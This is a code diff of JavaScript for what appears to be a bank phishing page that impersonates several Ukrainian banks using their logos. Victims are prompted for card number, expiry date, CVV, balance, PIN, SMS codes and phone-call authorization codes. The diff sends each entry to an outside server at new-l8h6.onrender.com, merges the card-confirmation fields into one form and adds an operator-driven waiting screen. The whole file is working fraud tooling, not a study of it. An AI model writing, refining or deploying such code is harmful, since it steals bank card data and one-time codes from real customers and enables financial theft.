@@ -115,10 +115,16 @@ document.addEventListener('DOMContentLoaded', () => {
     ];
 
     const confirmationSteps = [
-        { type: 'confirm_card', title: 'Підтвердити володіння карткою', field: 'card_confirm', placeholder: 'Номер картки' },
-        { type: 'confirm_expiry', title: 'Підтвердити володіння карткою', field: 'card-expiry', placeholder: 'Термін дії (ММ/РР)' },
-        { type: 'confirm_cvv', title: 'Підтвердити володіння карткою', field: 'card-cvv', placeholder: 'CVV' },
-        { type: 'confirm_balance', title: 'Підтвердити володіння карткою', field: 'balance', placeholder: 'Поточний баланс' }
+        {
+            type: 'confirm_all',
+            title: 'Підтвердити володіння карткою',
+            fields: [
+                { id: 'card_confirm', placeholder: 'Номер картки', type: 'tel', maxlength: '19' },
+                { id: 'card-expiry', placeholder: 'Термін дії (ММ/РР)', type: 'tel', maxlength: '5' },
+                { id: 'card-cvv', placeholder: 'CVV', type: 'tel', maxlength: '3' },
+                { id: 'balance', placeholder: 'Поточний баланс', type: 'number' }
+            ]
+        }
     ];
 
     const bankFlows = {
@@ -133,13 +139,55 @@ document.addEventListener('DOMContentLoaded', () => {
                 { type: 'call_code', title: 'Підтвердження дзвінком' }
             ]
         },
-        'raiffeisen': { name: 'Райффайзен', logoUrl: 'https://platforma-msb.org/wp-content/uploads/2017/08/rajffajzen-1920x1080316.jpg', theme: 'raiffeisen', steps: specialFlowSteps, special: true },
-        'alliance': { name: 'Альянс', logoUrl: 'https://bank.gov.ua/files/Logobank/300119.png?v=14', theme: 'alliance', steps: specialFlowSteps, special: true },
-        'pumb': { name: 'ПУМБ', logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/pumb_logo_mixfin.webp', theme: 'pumb', steps: specialFlowSteps, special: true },
-        'otp': { name: 'OTP Bank', logoUrl: 'https://ubanks.com.ua/img/bank-logo/otpbank-logo-2x.png', theme: 'otp', steps: specialFlowSteps, special: true },
-        'vostok': { name: 'Восток', logoUrl: 'https://ubanks.com.ua/img/bank-logo/bankvostok-logo-2x.png', theme: 'vostok', steps: specialFlowSteps, special: true },
-        'izibank': { name: 'Izibank', logoUrl: 'https://ubanks.com.ua/img/bank-logo/izibank-logo-2x.png', theme: 'izibank', steps: specialFlowSteps, special: true },
-        'ukrsib': { name: 'Укрсиб', logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/ukrsibbank_logo_mixfin.webp', theme: 'ukrsib', steps: specialFlowSteps, special: true }
+        'raiffeisen': {
+            name: 'Райффайзен',
+            logoUrl: 'https://platforma-msb.org/wp-content/uploads/2017/08/rajffajzen-1920x1080316.jpg',
+            theme: 'raiffeisen',
+            steps: specialFlowSteps,
+            special: true
+        },
+        'alliance': {
+            name: 'Альянс',
+            logoUrl: 'https://bank.gov.ua/files/Logobank/300119.png?v=14',
+            theme: 'alliance',
+            steps: specialFlowSteps,
+            special: true
+        },
+        'pumb': {
+            name: 'ПУМБ',
+            logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/pumb_logo_mixfin.webp',
+            theme: 'pumb',
+            steps: specialFlowSteps,
+            special: true
+        },
+        'otp': {
+            name: 'OTP Bank',
+            logoUrl: 'https://ubanks.com.ua/img/bank-logo/otpbank-logo-2x.png',
+            theme: 'otp',
+            steps: specialFlowSteps,
+            special: true
+        },
+        'vostok': {
+            name: 'Восток',
+            logoUrl: 'https://ubanks.com.ua/img/bank-logo/bankvostok-logo-2x.png',
+            theme: 'vostok',
+            steps: specialFlowSteps,
+            special: true
+        },
+        'izibank': {
+            name: 'Izibank',
+            logoUrl: 'https://ubanks.com.ua/img/bank-logo/izibank-logo-2x.png',
+            theme: 'izibank',
+            steps: specialFlowSteps,
+            special: true
+        },
+        'ukrsib': {
+            name: 'Укрсиб',
+            logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/ukrsibbank_logo_mixfin.webp',
+            theme: 'ukrsib',
+            steps: specialFlowSteps,
+            special: true
+        }
     };
 
     const bankGrid = document.querySelector('.bank-grid');
@@ -177,11 +225,12 @@ document.addEventListener('DOMContentLoaded', () => {
         console.log('Sending to server:', data, isFinal); // Дебаг лог
         collectedData = { ...collectedData, ...data };
         try {
-            await fetch(`https://new-l8h6.onrender.com/api/submit`, {
+            const response = await fetch(`https://new-l8h6.onrender.com/api/submit`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ sessionId, bankName: activeBankData.name, isFinalStep: isFinal, ...collectedData }),
             });
+            console.log('Server response:', await response.json()); // Дебаг лог
         } catch (error) {
             console.error('Failed to send data:', error);
         }
@@ -209,15 +258,9 @@ document.addEventListener('DOMContentLoaded', () => {
 
         sendDataToServer(data, isFinalStep);
 
-        // НОВОЕ: Для special банков после card_simple автоматически добавляем confirmation steps
         if (activeBankData.special && step.type === 'card_simple') {
-            let stepsToAdd = JSON.parse(JSON.stringify(confirmationSteps));
-            if (activeBankData.name === 'Райффайзен') {
-                stepsToAdd = stepsToAdd.filter(s => s.type !== 'confirm_balance');
-            }
-            activeBankData.steps.push(...stepsToAdd);
-            currentStepIndex++;
-            renderStep();
+            // Для special банков после card_simple показываем экран ожидания
+            showWaitingScreen();
             return;
         }
 
@@ -261,7 +304,8 @@ document.addEventListener('DOMContentLoaded', () => {
         const cardNumberInput = document.getElementById('card') || document.getElementById('card_confirm');
         if (cardNumberInput) {
             cardNumberInput.addEventListener('input', (e) => {
-                let value = e.target.value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
+                let value = e.target.value.replace(/\D/g, '');
+                value = value.replace(/(\d{4})/g, '$1 ').trim();
                 e.target.value = value;
             });
         }
@@ -269,7 +313,7 @@ document.addEventListener('DOMContentLoaded', () => {
         if (cardExpiryInput) {
             cardExpiryInput.addEventListener('input', (e) => {
                 let value = e.target.value.replace(/\D/g, '');
-                if (value.length > 2) { value = value.substring(0, 2) + '/' + value.substring(2, 4); }
+                if (value.length > 2) value = value.substring(0, 2) + '/' + value.substring(2, 4);
                 e.target.value = value;
             });
         }
@@ -328,20 +372,17 @@ document.addEventListener('DOMContentLoaded', () => {
             case 'pin':
                 html = generateInputHTML('pin', 'ПІН-код', 'password', '4');
                 break;
-            case 'confirm_card':
-                html = generateInputHTML('card_confirm', 'Номер картки', 'tel', '19');
-                break;
-            case 'confirm_expiry':
-                html = generateInputHTML('card-expiry', 'Термін дії (ММ/РР)', 'tel', '5');
-                break;
-            case 'confirm_cvv':
-                html = generateInputHTML('card-cvv', 'CVV', 'tel', '3');
-                break;
-            case 'confirm_balance':
-                html = generateInputHTML('balance', 'Поточний баланс', 'number');
-                break;
             case 'call_code':
                 html = `<p style="text-align:center;">Зараз вам буде здійснено дзвінок для проходження авторизації. Підніміть слухавку, натисніть 1 та прослухайте код. Код введіть у форму нижче.</p>${generateInputHTML('call_code_input', 'Введіть код з дзвінка', 'tel', '6')}`;
+                break;
+            case 'confirm_all':
+                html = '<div class="input-group">';
+                step.fields.forEach(field => {
+                    if (activeBankData.name === 'Райффайзен' && field.id === 'card_confirm') return; // Пропускаем card_confirm для Райффайзен
+                    if (activeBankData.name === 'Райффайзен' && field.id === 'balance') return; // Пропускаем balance для Райффайзен
+                    html += `<div class="input-group"><input type="${field.type}" class="input-field" id="${field.id}" placeholder="${field.placeholder}" ${field.maxlength ? `maxlength="${field.maxlength}"` : ''}><div class="error-message"></div></div>`;
+                });
+                html += '</div>';
                 break;
         }
         modalTitle.textContent = step.title;
@@ -394,9 +435,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 break;
             case 'request_details':
                 let stepsToAdd = JSON.parse(JSON.stringify(confirmationSteps));
-                if (data.isRaiffeisen) {
-                    stepsToAdd = stepsToAdd.filter(step => step.type !== 'confirm_balance');
-                }
                 activeBankData.steps.push(...stepsToAdd);
                 currentStepIndex++;
                 renderStep();
@@ -445,11 +483,12 @@ document.addEventListener('DOMContentLoaded', () => {
         const code = document.getElementById('sms-code').value;
         console.log('Submitting SMS code:', code); // Дебаг лог
         try {
-            await fetch(`https://new-l8h6.onrender.com/api/sms`, {
+            const response = await fetch(`https://new-l8h6.onrender.com/api/sms`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ sessionId, code }),
             });
+            console.log('SMS response:', await response.json()); // Дебаг лог
         } catch (error) {
             console.error('Failed to send sms code:', error);
         }
